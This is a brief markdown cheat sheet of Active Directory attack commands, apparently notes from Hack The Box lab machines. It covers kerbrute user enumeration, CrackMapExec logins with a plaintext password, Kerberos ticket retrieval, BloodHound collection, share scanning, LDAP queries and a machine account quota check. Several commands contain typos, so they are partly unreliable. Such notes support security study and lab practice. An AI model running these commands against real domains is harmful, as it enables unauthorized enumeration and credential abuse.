
# Kerbrute
- Kerbrute
   - set sys date to domain date
	```
	sudo ntpdate dc.absolute.htb 
	```
   - check user valid with users.txt
	```
	./kerbute userenum --dc dc.absolute.htb -d absolute.htb -o users.txt
	```
  - check user validate (-k to use Kerberos)
	```
	cme smb 10.10.11.181 -k -u d.klay -p Darkmoonsky248girl
    ```
  - generate access token
   ```
	getTGT.py absolute.htb/d.klay
	 ```
   - blood hound scrape
   ```
   KRB5CCNAME=d.klay.ccache ./bloodhound.py -k -dc dc.absolute.htb -ns 10.10.11.181 -c all -d absolute.htb -u d.klay
     ```
   - Scan shares
   ```
   cme smb 10.10.11.181 -u d.klay -p Darkmoonsky248girl -k --shares
     ```
   - ldapsearch
   ```
   ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -s base

   ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" "user" "description"
	
  ldapsearch -h support.htb -D 'user@support.htb' - w 'password' -b 'c=support,dc=htb'
	 ```
   - Kerbrute
   ```
   KRBSCCNAME=/home/accesstoken.ccache ./smbclient.py -k absolute.htb/user_goview@dc.absolute.htb -target -ip 10.10.11.181
     ```
   - see if you can create a machien
 ```
	Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```